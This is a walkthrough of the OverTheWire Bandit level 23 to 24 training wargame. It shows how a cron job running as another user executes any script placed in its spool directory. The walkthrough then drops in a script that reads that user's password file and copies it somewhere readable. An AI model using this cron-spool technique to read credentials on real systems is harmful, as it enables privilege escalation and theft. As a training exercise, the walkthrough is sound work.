// Bandit Level 23 → Level 24

URL: https://overthewire.org/wargames/bandit/

Step1: Log in to the Bandit Level 23 server:

        ssh bandit23@bandit.labs.overthewire.org -p 2220

Step2: Enter the password obtained from Bandit Level 22.

Step3: Check the cron job:

        cat /etc/cron.d/cronjob_bandit24

Step4: We can see that a script is executed as the `bandit24` user:

        /usr/bin/cronjob_bandit24.sh

Step5: Read the script:

        cat /usr/bin/cronjob_bandit24.sh

Step6: The important part of the script is:

        cd /var/spool/$myname

        for i in * .*;
        do
            if [ "$i" != "." -a "$i" != ".." ];
            then
                timeout -s 9 60 "./$i"
                rm -f "./$i"
            fi
        done

Step7: Since the script runs as `bandit24`, `$myname` becomes:

        bandit24

Step8: Therefore, the cron job executes files placed in:

        /var/spool/bandit24

Step9: Our goal is to create a shell script that reads the Bandit Level 24 password and saves it somewhere that `bandit23` can read.

Step10: Create a temporary directory:

        mkdir /tmp/bandit23

Step11: Give ourselves permission to use it:

        chmod 777 /tmp/bandit23

Step12: Create our shell script:

        nano /tmp/bandit23/script.sh

Step13: Put this inside the script:

        #!/bin/bash
        cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password
        chmod 644 /tmp/bandit23/password

Step14: Make the script executable:

        chmod +x /tmp/bandit23/script.sh

Step15: Copy the script into the directory monitored by the cron job:

        cp /tmp/bandit23/script.sh /var/spool/bandit24/

Step16: Wait for the cron job to execute the script. It normally runs once every minute.

Step17: After the script has been executed, read the password:

        cat /tmp/bandit23/password

